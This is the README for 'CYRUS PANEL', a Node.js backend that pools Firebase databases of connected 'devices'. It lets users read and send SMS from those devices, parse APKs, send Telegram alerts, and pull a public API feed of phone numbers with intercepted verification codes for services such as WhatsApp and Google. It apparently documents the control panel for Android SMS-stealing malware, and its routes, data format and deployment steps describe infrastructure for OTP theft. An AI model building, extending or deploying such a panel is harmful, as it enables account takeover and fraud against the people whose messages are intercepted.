# CYRUS PANEL – Full-Featured Node.js Backend

A production-ready **Node.js + Express** panel with admin management, unified Firebase connections, OTP API, authentication, and user management.

## Architecture

```
┌──────────────┐     ┌──────────────────────────────────┐
│   ADMIN      │     │        USERS (unlimited)          │
│              │     │                                   │
│  /admin/     │     │  /dashboard/  /profile/           │
│              │     │                                   │
│ • Add Firebase│    │  • See ALL devices from ALL       │
│ • Manage Users│    │    connected Firebase databases    │
│ • View Stats  │    │  • Live OTP feed                  │
│ • Test DBs   │     │  • Device controls                │
│              │     │  • SMS sending                    │
└──────┬───────┘     └──────────────┬───────────────────┘
       │                            │
       │    ┌───────────────────┐   │
       └───▶│  Firebase Pool    │◀──┘
            │  (all connected   │
            │   databases)      │
            └────────┬──────────┘
                     │
              ┌──────▼──────┐
              │  OTP API    │
              │ /api/otp    │
              │ (public)    │
              └─────────────┘
```

**Key concept**: Admin adds Firebase databases → All databases are unified → Every user sees all devices/OTPs from every connected database together.

## Quick Start

```bash
npm install
cp .env.example .env    # Edit with your settings
npm run build           # Build static frontend
npm start               # Start server on :3000
```

## Admin Setup

Two methods to create the first admin:

**Method 1: .env bootstrap** (recommended for deployment)
```bash
ADMIN_USERNAME=admin
ADMIN_PASSWORD=your-secure-password
```

**Method 2: First registration**
The very first user to register at `/register/` automatically becomes admin.

## Pages

| Route | Access | Description |
|-------|--------|-------------|
| `/login/` | Public | Login page |
| `/register/` | Public | Create account |
| `/admin/` | **Admin only** | Firebase connections, user management, stats |
| `/dashboard/` | Logged in | Full panel with all devices from all databases |
| `/profile/` | Logged in | Profile, API key, password change |
| `/connections/` | Logged in | View active connections (read-only for users) |
| `/` | Public | Original React panel |

## API Endpoints

### Authentication
| Method | Endpoint | Description |
|--------|----------|-------------|
| POST | `/api/auth/register` | Create account `{username, email, password}` |
| POST | `/api/auth/login` | Login `{login, password}` → JWT cookie |
| POST | `/api/auth/logout` | Clear session |
| GET | `/api/auth/me` | Current user (requires auth) |
| PUT | `/api/auth/password` | Change password (requires auth) |

### Admin Panel 🔐 (requires admin role)
| Method | Endpoint | Description |
|--------|----------|-------------|
| GET | `/api/admin/connections` | List all Firebase connections |
| POST | `/api/admin/connections` | Add Firebase DB `{name, url, key}` |
| PUT | `/api/admin/connections/:id` | Update connection |
| DELETE | `/api/admin/connections/:id` | Remove connection |
| POST | `/api/admin/connections/:id/test` | Test connection & count devices |
| GET | `/api/admin/users` | List all users |
| PUT | `/api/admin/users/:id/toggle` | Enable/disable user |
| PUT | `/api/admin/users/:id/role` | Change role `{role: "admin"/"user"}` |
| DELETE | `/api/admin/users/:id` | Delete user |
| GET | `/api/admin/stats` | System statistics |

### OTP API 📡 (public, like numberpanel.tech)
| Method | Endpoint | Description |
|--------|----------|-------------|
| GET | `/api/otp?count=10` | Get OTP codes from all databases |
| GET | `/api/otp/stats` | API statistics |

**Response format:**
```json
[
  ["WhatsApp", "919876543210", "Your WhatsApp code 123-456", "2026-08-13 13:00:00", " India"],
  ["Google", "14155551234", "G-654321 is your code", "2026-08-13 12:59:00", " USA/Canada"]
]
```

Each entry: `[service, phone_number, raw_sms, timestamp, country]`

Supports: `?count=N` (max 100), `?fresh=1` (bypass cache), `?key=API_KEY` (auth)

### Profile
| Method | Endpoint | Description |
|--------|----------|-------------|
| GET | `/api/profile` | Get profile + stats |
| PUT | `/api/profile` | Update `{email, phone, bio}` |
| POST | `/api/profile/regenerate-key` | Regenerate API key |

### Firebase Proxy & Devices
| Method | Endpoint | Description |
|--------|----------|-------------|
| POST | `/api/firebase/read` | Read from Firebase `{url, key, path}` |
| POST | `/api/firebase/write` | Write to Firebase |
| POST | `/api/devices/list` | List all devices `{url, key}` |
| POST | `/api/devices/:id/messages` | Get device SMS |
| POST | `/api/devices/:id/send-sms` | Queue SMS `{to, message}` |

### Other
| Method | Endpoint | Description |
|--------|----------|-------------|
| GET | `/api/health` | Health check |
| POST | `/api/apk/parse` | Parse APK (multipart upload) |

## Project Structure

```
indianpanel/
├── server.js                     # Express entry (bootstraps admin)
├── src/
│   ├── config/index.js           # Configuration
│   ├── database.js               # JSON-file database
│   ├── middleware/
│   │   ├── auth.js               # requireAuth, requireAdmin
│   │   ├── errorHandler.js       # Error handling
│   │   ├── rateLimiter.js        # Rate limiting
│   │   └── validate.js           # Input validation
│   ├── routes/
│   │   ├── api.js                # API router
│   │   ├── admin.js              # 🔐 Admin panel routes
│   │   ├── auth.js               # Login/register
│   │   ├── profile.js            # Profile management
│   │   ├── otp.js                # OTP API
│   │   ├── firebase.js           # Firebase proxy
│   │   ├── devices.js            # Device management
│   │   ├── apk.js                # APK parsing
│   │   ├── telegram.js           # Telegram notifications
│   │   └── health.js             # Health check
│   ├── services/
│   │   ├── auth.js               # JWT, bcrypt, admin bootstrap
│   │   ├── connections.js        # Global Firebase connections
│   │   ├── firebase.js           # Firebase operations
│   │   ├── otpExtractor.js       # OTP detection (30+ services)
│   │   ├── devices.js            # Device normalization
│   │   ├── phoneExtractor.js     # Phone extraction
│   │   └── telegram.js           # Telegram Bot API
│   └── utils/format.js           # Formatting helpers
├── admin/index.html              # 🔐 Admin panel UI
├── login/index.html              # Login page
├── register/index.html           # Registration page
├── profile/index.html            # Profile page
├── connections/index.html        # Connections view
├── assets/app.css                # Shared CSS
├── client-js/                    # Client-side JS modules
├── data/                         # JSON database (gitignored)
└── scripts/build-frontend.js     # Build script
```

## Environment Variables

| Variable | Description |
|----------|-------------|
| `PORT` | Server port (default: 3000) |
| `NODE_ENV` | `development` or `production` |
| `SESSION_SECRET` | JWT signing secret — **change in production** |
| `ADMIN_USERNAME` | Bootstrap admin username |
| `ADMIN_PASSWORD` | Bootstrap admin password |
| `ADMIN_EMAIL` | Bootstrap admin email |
| `TG_BOT_TOKEN` | Telegram bot token |
| `TG_CHAT_ID` | Telegram chat ID |
| `RATE_LIMIT_WINDOW_MS` | Rate limit window (default: 15 min) |
| `RATE_LIMIT_MAX_REQUESTS` | Max requests per window (default: 100) |

## Deployment

```dockerfile
FROM node:20-slim
WORKDIR /app
COPY package*.json ./
RUN npm ci --production
COPY . .
RUN npm run build
ENV NODE_ENV=production
ENV ADMIN_USERNAME=admin
ENV ADMIN_PASSWORD=secure-password-here
ENV SESSION_SECRET=long-random-string-here
EXPOSE 3000
CMD ["node", "server.js"]
```

## License

UNLICENSED – Private use only.
